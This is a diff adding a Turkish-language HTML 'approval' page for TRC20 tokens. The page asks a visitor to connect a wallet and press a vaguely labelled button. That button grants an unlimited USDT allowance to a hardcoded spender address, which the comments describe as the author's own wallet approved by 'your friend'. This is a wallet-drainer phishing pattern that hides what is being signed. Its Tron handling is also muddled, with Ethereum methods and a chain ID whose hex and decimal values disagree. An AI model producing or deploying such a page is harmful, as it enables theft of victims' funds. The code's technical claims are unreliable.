@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TRC20 Onay DApp</title>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
+    <script src="https://unpkg.com/@walletconnect/web3modal@1.9.0/dist/index.js"></script>
+    <script src="https://unpkg.com/web3@1.5.2/dist/web3.min.js"></script>
+    <style>
+        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background-color: #f0f2f5; }
+        .container { background: white; padding: 25px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 90%; }
+        button { background-color: #007bff; color: white; padding: 12px 20px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; margin-top: 15px; }
+        button:hover { background-color: #0056b3; }
+        #status { margin-top: 20px; font-weight: bold; color: #333; }
+        .address-display { word-break: break-all; margin-top: 10px; font-size: 0.9em; color: #555; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>TRC20 Onay İşlemi</h1>
+        <p>Devam etmek için cüzdanınızı bağlayın ve onay işlemini başlatın.</p>
+        <button id="connectButton">Cüzdanı Bağla</button>
+        <div id="accountInfo" class="address-display" style="display: none;">
+            <p>Bağlı Adres: <span id="connectedAddress"></span></p>
+        </div>
+        <button id="approveButton" style="display: none;">Onayı Başlat</button>
+        <p id="status"></p>
+    </div>
+
+    <script>
+        // TRC20 Token Sözleşme Adresi (Örn: USDT TRC20)
+        // ** ÖNEMLİ: Kendi token'ınızın veya onaylamak istediğiniz token'ın sözleşme adresini buraya girin. **
+        const TOKEN_CONTRACT_ADDRESS = "TR7NHqTKXQDkCjW85Jtkp8FCyMmm3yB6Kz"; // Örnek USDT TRC20 adresi
+        
+        // Onay vermek istediğiniz adres (harcayıcı/spender)
+        // ** ÖNEMLİ: Bu, sizin arkadaşınızın onay vermesini istediğiniz kendi cüzdan adresiniz olmalı. **
+        const SPENDER_ADDRESS = "TLhYtE2G1e8pL3pG5m5YF92tF8c7X6j9Kz"; // Kendi Tron adresiniz (örnek)
+
+        // Onay miktarı (genellikle maksimum onay için çok büyük bir sayı)
+        // TRC20 token'larının 6 ondalık hanesi olduğunu varsayarsak, 10^18 (maksimum)
+        // Daha az bir miktar onaylamak istiyorsanız bu değeri ayarlayın (örn: 100 token için 100 * 10^6).
+        // Bu örnekte, 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff' = 2^256 - 1'i temsil eden bir miktar kullanılacak.
+        // Bu, akıllı sözleşmelerde sıkça kullanılan, neredeyse sonsuz bir onay miktarıdır.
+        const APPROVE_AMOUNT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"; // Maksimum onay
+
+        let web3Modal;
+        let provider;
+        let tronWeb;
+        let connectedAccount = null;
+
+        const connectButton = document.getElementById('connectButton');
+        const approveButton = document.getElementById('approveButton');
+        const statusDiv = document.getElementById('status');
+        const connectedAddressSpan = document.getElementById('connectedAddress');
+        const accountInfoDiv = document.getElementById('accountInfo');
+
+        // Web3Modal'ı Başlat
+        async function initWeb3Modal() {
+            const providerOptions = {
+                injected: {
+                    display: {
+                        name: "Injected",
+                        description: "Connect with the browser extension",
+                    },
+                    package: null
+                },
+                // WalletConnect sağlayıcısını Tron için yapılandır
+                // Trust Wallet ve diğer birçok cüzdan WalletConnect ile bağlanır.
+                walletconnect: {
+                    package: window.WalletConnectProvider.default, // WalletConnectProvider'ı global olarak yükleyin
+                    options: {
+                        rpc: {
+                            7281286: "https://api.trongrid.io", // Tron Mainnet Chain ID ve RPC URL'si
+                            // Diğer Tron ağları için de buraya ekleyebilirsiniz (örn: Nile Testnet)
+                        },
+                        network: "Tron" // İsteğe bağlı, cüzdana hangi ağı beklediğini bildirir
+                    }
+                }
+            };
+
+            web3Modal = new window.Web3Modal.default({
+                cacheProvider: false, // Sayfa yüklendiğinde bağlantıyı otomatik sürdürme
+                providerOptions, // Desteklenen sağlayıcılar
+                disableInjectedProvider: false, // Metamask gibi tarayıcı eklentilerini devre dışı bırakma
+            });
+        }
+
+        // Cüzdanı Bağla İşlevi
+        async function connectWallet() {
+            try {
+                statusDiv.textContent = "Cüzdan bağlanıyor...";
+                provider = await web3Modal.connect(); // Sağlayıcıyı al (örn: Trust Wallet'tan)
+                
+                // Sağlayıcıya olay dinleyicileri ekle
+                provider.on("accountsChanged", (accounts) => {
+                    console.log("Accounts changed:", accounts);
+                    updateAccount(accounts[0]);
+                });
+                provider.on("chainChanged", (chainId) => {
+                    console.log("Chain changed:", chainId);
+                    if (chainId !== "0x6f6f00") { // Tron Mainnet Chain ID (decimal 7281286, hex 0x6f6f00)
+                        statusDiv.textContent = "Lütfen Tron ana ağına geçin.";
+                        approveButton.style.display = 'none';
+                    } else {
+                        statusDiv.textContent = "Tron ağına bağlı.";
+                        if (connectedAccount) approveButton.style.display = 'block';
+                    }
+                });
+                provider.on("disconnect", (code, reason) => {
+                    console.log("Provider disconnected", code, reason);
+                    resetApp();
+                });
+
+                // TronWeb'i başlat
+                const currentWeb3 = new Web3(provider); // Web3.js ile provider'ı kullan
+                const accounts = await currentWeb3.eth.getAccounts(); // Hesapları al
+
+                if (accounts.length === 0) {
+                    statusDiv.textContent = "Hesap bulunamadı.";
+                    resetApp();
+                    return;
+                }
+
+                connectedAccount = accounts[0];
+                updateAccount(connectedAccount);
+                
+                // TronWeb'i TRON ağı ile yapılandır
+                // WalletConnect ile gelen provider'ı TronWeb'e doğrudan vermek zor olabilir.
+                // Bunun yerine, WalletConnect üzerinden işlem imzalama yaklaşımını kullanacağız.
+                // Bu örnekte, TronWeb doğrudan kullanılmaz, ancak Web3.js ve WalletConnect aracılığıyla işlem gönderilir.
+                // Not: WalletConnect'in Tron ile tam uyumluluğu için `tron_signTransaction` RPC metodunu desteklemesi gerekir.
+
+                statusDiv.textContent = "Cüzdan başarıyla bağlandı!";
+                connectButton.style.display = 'none';
+                approveButton.style.display = 'block';
+
+            } catch (e) {
+                console.error("Cüzdan bağlanırken hata oluştu:", e);
+                statusDiv.textContent = "Cüzdan bağlanamadı: " + e.message;
+            }
+        }
+
+        function updateAccount(account) {
+            connectedAccount = account;
+            connectedAddressSpan.textContent = connectedAccount;
+            accountInfoDiv.style.display = 'block';
+        }
+
+        function resetApp() {
+            connectedAccount = null;
+            connectedAddressSpan.textContent = "";
+            accountInfoDiv.style.display = 'none';
+            connectButton.style.display = 'block';
+            approveButton.style.display = 'none';
+            statusDiv.textContent = "Bağlantı kesildi.";
+        }
+
+        // Onay İşlemini Başlat İşlevi
+        async function initiateApprove() {
+            if (!connectedAccount) {
+                statusDiv.textContent = "Lütfen önce cüzdanınızı bağlayın.";
+                return;
+            }
+
+            statusDiv.textContent = "Onay işlemi hazırlanıyor... Lütfen cüzdanınızda onaylayın.";
+
+            try {
+                // TRC20 ABI'sinin sadece "approve" fonksiyonu için gerekli kısmı
+                const TRC20_ABI = [
+                    {
+                        "constant": false,
+                        "inputs": [
+                            { "name": "spender", "type": "address" },
+                            { "name": "amount", "type": "uint256" }
+                        ],
+                        "name": "approve",
+                        "outputs": [{ "name": "", "type": "bool" }],
+                        "payable": false,
+                        "stateMutability": "nonpayable",
+                        "type": "function"
+                    }
+                ];
+
+                const currentWeb3 = new Web3(provider);
+                const tokenContract = new currentWeb3.eth.Contract(TRC20_ABI, TOKEN_CONTRACT_ADDRESS);
+
+                // Onay işlemini çağır
+                const transaction = await tokenContract.methods.approve(SPENDER_ADDRESS, APPROVE_AMOUNT).encodeABI();
+                
+                // Tron ağında işlem göndermek için WalletConnect'in `eth_sendTransaction` metodunu kullanın
+                // WalletConnect, Tron için özel bir 'tron_signTransaction' veya 'tron_sendTransaction' metodu sağlamalıdır.
+                // WalletConnect'in Tron ağları için doğru RPC yapılandırması gereklidir.
+                
+                const txParams = {
+                    from: connectedAccount,
+                    to: TOKEN_CONTRACT_ADDRESS,
+                    data: transaction,
+                    // Tron ağında işlem ücreti için 'callValue' (TRX miktarı) ve 'feeLimit' (enerji/bant genişliği) gerekebilir.
+                    // WalletConnect ile bunlar genellikle cüzdan tarafından yönetilir veya otomatik olarak eklenir.
+                    // Gerekiyorsa, TronLink'in istediği gibi ek alanlar eklenebilir.
+                };
+
+                const txHash = await provider.request({
+                    method: 'eth_sendTransaction', // Veya Tron için özel bir WalletConnect metodu: 'tron_sendTransaction'
+                    params: [txParams],
+                });
+
+                statusDiv.textContent = `Onay işlemi başarıyla gönderildi! İşlem Hash: ${txHash}`;
+                console.log("İşlem Hash:", txHash);
+
+            } catch (error) {
+                console.error("Onay işlemi başarısız oldu:", error);
+                statusDiv.textContent = "Onay işlemi iptal edildi veya bir hata oluştu: " + error.message;
+            }
+        }
+
+        // Olay dinleyicileri
+        connectButton.addEventListener('click', connectWallet);
+        approveButton.addEventListener('click', initiateApprove);
+
+        // Web3Modal'ı sayfa yüklendiğinde başlat
+        window.addEventListener('load', initWeb3Modal);
+    </script>
+</body>
+</html>
